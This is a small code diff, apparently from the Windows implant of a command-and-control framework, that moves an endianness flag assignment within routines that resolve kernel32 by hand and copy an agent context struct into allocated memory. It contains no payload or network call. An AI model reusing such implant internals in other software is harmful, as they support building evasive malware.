@@ -1,5 +1,6 @@
 #include <core/corelib.hpp>
 #define ENDIANESS 1
+
 namespace Memory {
 
     VOID ResolveApi() {
@@ -7,6 +8,7 @@ namespace Memory {
 
         OSVERSIONINFOW OSVersionW = {};
 
+        x_memset(&Ctx->LE, ENDIANESS, 1);
         if (!(Ctx->Modules.kernel32 = LdrGetModuleAddress(KERNEL32))) {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
@@ -166,7 +168,6 @@ namespace Memory {
             return;
         }
 
-        x_memset(&Instance.LE, ENDIANESS, 1);
         x_memcpy(C_DREF(MmAddr), &Instance, sizeof(HEXANE_CTX));
         x_memset(&Instance, 0, sizeof(HEXANE_CTX));
         x_memset(C_PTR(U_PTR(MmAddr) + sizeof(LPVOID)), 0, 0xE);
